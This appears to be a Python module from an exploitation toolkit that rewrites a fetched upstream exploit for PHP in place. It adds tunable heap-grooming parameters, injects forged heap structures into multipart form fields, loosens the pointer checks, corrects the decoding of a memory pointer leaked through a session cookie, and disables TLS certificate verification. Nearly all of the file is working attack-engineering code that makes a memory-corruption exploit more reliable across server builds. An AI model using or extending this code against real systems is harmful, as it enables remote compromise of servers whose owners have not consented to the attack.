#!/usr/bin/env python3
"""Runtime changes applied to the fetched upstream exploit.

The upstream repository has no explicit license, so its source is not vendored
and no patch file is redistributed. The toolkit applies the minimal changes in
place: SNI on HTTPS and environment overrides for the heap parameters. The same
changes are documented in docs/upstream-changes.md for manual use.
"""

from __future__ import annotations

import os


def _read(repo: str) -> tuple[str, str] | None:
    path = os.path.join(repo, "exploit.py")
    try:
        with open(path, encoding="utf-8") as fh:
            return path, fh.read()
    except OSError:
        return None


def patch_params(repo: str) -> bool:
    """Inject P2S_STAGE1_N / P2S_FORGE_LEN / P2S_STAGE2_T / P2S_STAGE2_V / P2S_STAGE3_*."""
    found = _read(repo)
    if not found:
        return False
    path, source = found
    knobs_block = (
        "        # P2S_STAGE3_KNOBS\n"
        "        pads_env = _os.environ.get('P2S_STAGE3_PADS')\n"
        "        if pads_env:\n"
        "            self.stage3_pads = [tuple(int(x) for x in item.split(':'))\n"
        "                                for item in pads_env.split(',') if item]\n"
        "        self._p2s_cookie = _os.environ.get('P2S_STAGE3_COOKIE') == '1'\n"
        "        self._p2s_wfields = int(_os.environ.get('P2S_STAGE3_WFIELDS', '0') or 0)\n"
        "        self._p2s_fake_len = int(_os.environ.get('P2S_STAGE3_FAKE_LEN', '0') or 0)\n"
        "        self._p2s_fakes = int(_os.environ.get('P2S_STAGE3_FAKES', '0') or 0)\n"
        "        self._p2s_b_name_len = int(_os.environ.get('P2S_STAGE3_B_NAME_LEN', '0') or 0)\n")
    if "P2S_STAGE1_N" in source:
        if "P2S_STAGE3_KNOBS" in source:
            return False
        anchor = "        self.stage2_v = int(_os.environ.get('P2S_STAGE2_V', self.stage2_v))\n"
        if anchor not in source:
            return False
        source = source.replace(anchor, anchor + knobs_block, 1)
    else:
        anchor = "            self.stage3_carrier = False\n"
        if anchor not in source:
            return False
        inject = anchor + (
            "        import os as _os\n"
            "        self.stage1_n = int(_os.environ.get('P2S_STAGE1_N', self.stage1_n))\n"
            "        self.stage1_forge_len = int(_os.environ.get('P2S_FORGE_LEN', 79))\n"
            "        self.stage2_t = int(_os.environ.get('P2S_STAGE2_T', self.stage2_t))\n"
            "        self.stage2_v = int(_os.environ.get('P2S_STAGE2_V', self.stage2_v))\n"
            + knobs_block)
        source = source.replace(anchor, inject, 1)
        source = source.replace('forge = bytearray(b"A" * 79)',
                                'forge = bytearray(b"A" * self.stage1_forge_len)')
        source = source.replace('if 0x7F0000000000 <= v < 0x800000000000:',
                                'if 0x10000 < v < 0x0001000000000000:')
        source = source.replace('if not (0x7F0000000000 <= p < 0x800000000000):',
                                'if not (0x10000 < p < 0x0001000000000000):')
    # stage-3 composition knobs (measured per build; see docs/upstream-changes.md 2b)
    stage3_patches = [
        ("        parts += [self._file_part(), self._big_field()]",
         "        for wi in range(getattr(self, '_p2s_wfields', 0) or 0):\n"
         "            parts.append({\"name\": \"s%04d\" % wi, \"data\": b\"w\"})\n"
         "        parts += [self._file_part(), self._big_field()]"),
        ('if self.profile == "bookworm":',
         'if self.profile == "bookworm" or getattr(self, "_p2s_cookie", False):'),
        ("else:\n"
         "            for i in range(15):\n"
         "                parts.append({\"name\": f\"a{i:030d}\"[:31], \"data\": ht})\n"
         "            for i in range(2):\n"
         "                parts.append({\"name\": f\"f{i:02d}\", \"data\": ref})",
         "else:\n"
         "            bnl = getattr(self, '_p2s_b_name_len', 0) or 31\n"
         "            for i in range(15):\n"
         "                parts.append({\"name\": f\"a{i:030d}\"[:bnl], \"data\": ht})\n"
         "            flen = getattr(self, '_p2s_fake_len', 0) or 0\n"
         "            nfakes = getattr(self, '_p2s_fakes', 0) or 2\n"
         "            if flen:\n"
         "                fake = (struct.pack(\"<II\", 1, 0x1A) + struct.pack(\"<Q\", htdata)\n"
         "                        + struct.pack(\"<II\", 0x307, 0) + b\"F\" * (flen - 24))\n"
         "            else:\n"
         "                fake = ref\n"
         "            for i in range(nfakes):\n"
         "                parts.append({\"name\": f\"f{i:02d}\", \"data\": fake})"),
    ]
    for old, new in stage3_patches:
        if old in source:
            source = source.replace(old, new, 1)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(source)
    return True


def patch_cookie_decode(repo: str) -> bool:
    """Decode '+' as a space in the leaked Set-Cookie value.

    PHP urlencode()s the session id for the cookie header, and that encoding
    writes a space byte (0x20) as '+'. urllib's unquote_to_bytes() leaves '+'
    untouched, so any leaked pointer whose address contains a 0x20 byte was
    read back 0xB00000000 too high (0x20 -> 0x2b) and every stage-3 address
    derived from it missed. Rewriting '+' to '%20' before unquoting restores
    the real bytes; a true '+' byte in memory arrives as '%2B' and decodes
    back to '+' either way, so the rewrite is lossless.
    """
    found = _read(repo)
    if not found:
        return False
    path, source = found
    original = ('    return urllib.parse.unquote_to_bytes'
                '(m.group(1).decode("latin1"))')
    if original not in source:
        return False
    source = source.replace(
        original,
        '    raw = m.group(1).replace(b"+", b"%20")\n'
        '    return urllib.parse.unquote_to_bytes(raw.decode("latin1"))')
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(source)
    return True


def patch_tls(repo: str) -> bool:
    """Accept the lab certificate and always send SNI.

    Some HTTPS servers (and CDNs) answer a handshake without SNI with
    TLSV1_ALERT_INTERNAL_ERROR; keeping server_hostname is required.
    """
    found = _read(repo)
    if not found:
        return False
    path, source = found
    original = source
    source = source.replace("ctx = ssl.create_default_context()",
                            "ctx = ssl._create_unverified_context()")
    source = source.replace("s = ctx.wrap_socket(s)",
                            "s = ctx.wrap_socket(s, server_hostname=self.host)")
    if source == original:
        return False
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(source)
    return True
